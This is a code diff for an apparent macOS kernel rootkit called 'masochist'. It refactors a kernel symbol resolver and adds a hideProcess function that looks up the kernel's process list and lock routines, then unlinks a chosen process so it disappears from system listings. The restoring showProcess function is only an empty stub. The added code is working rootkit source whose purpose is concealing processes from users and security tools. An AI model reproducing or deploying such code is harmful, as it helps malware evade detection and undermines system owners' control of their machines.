@@ -20,8 +20,10 @@ kern_return_t masochist_stop(kmod_info_t *ki, void *d);
 #define SLIDE 0x0
 #define KERNEL_BASE (0xffffff8000200000 + SLIDE) /* use slide.c */
 
+struct mach_header_64 *kernel_header = 0x0;
+
 void *
-find_symbol(const char *symbol, struct mach_header_64 *header) {
+find_symbol(const char *symbol) {
     
     struct load_command *lc = NULL;
     struct segment_command_64 *seg = NULL;
@@ -33,7 +35,7 @@ find_symbol(const char *symbol, struct mach_header_64 *header) {
     
     /* iterate through all of the load commands until we find __LINKEDIT */
     int i;
-    for(i = 0; i < header->ncmds; i++) {
+    for(i = 0; i < kernel_header->ncmds; i++) {
         
         if(lc->cmd == LC_SEGMENT_64) {
             
@@ -63,7 +65,7 @@ find_symbol(const char *symbol, struct mach_header_64 *header) {
     /* iterate through load commands again and look for LC_SYMTAB */
     
     struct symtab_command *lc_symtab;
-    for(i = 0; i < header->ncmds; i++) {
+    for(i = 0; i < kernel_header->ncmds; i++) {
         
         if(lc->cmd == LC_SYMTAB) {
             
@@ -100,15 +102,60 @@ find_symbol(const char *symbol, struct mach_header_64 *header) {
     }
     
     /* FAILURE */
-    return 0;
+    return NULL;
     
+}
+
+kern_return_t
+hideProcess(pid_t pid) {
+    
+    /* Find the required symbols */
+    struct proclist *allproc = find_symbol("_allproc");
+    void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
+    void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
+    
+    /* Make sure they're all resolved */
+    if(!allproc || !proc_list_lock || !proc_list_unlock)
+        return KERN_FAILURE;
+    
+    struct proc *process = NULL;
+    
+    /* Iterate through the entire process list just like Apple does */
+    for (process = allproc->lh_first; process != 0; process = process->p_list.le_next) {
+        
+        /* If process is the process we're looking for, hide it */
+        if(process->p_pid == pid) {
+            /* XXX: Save into an array of hidden processes so we can recover it later */
+            
+            /* Lock the process list before we modify it */
+            proc_list_lock();
+            
+            /* Actually remove the process. */
+            LIST_REMOVE(process, p_list);
+            
+            /* Unlock the list */
+            proc_list_unlock();
+            
+            return KERN_SUCCESS;
+        }
+        
+    }
+    
+    return KERN_SUCCESS;
+    
+}
+
+kern_return_t
+showProcess(pid_t process) {
+    
+    return KERN_SUCCESS;
 }
 
 kern_return_t
 masochist_start(kmod_info_t * ki, void *d) {
     
     /* Get the mach header of the kernel */
-    struct mach_header_64 *kernel_header = (struct mach_header_64 *)KERNEL_BASE;
+    kernel_header = (struct mach_header_64 *)KERNEL_BASE;
     
     /*
      
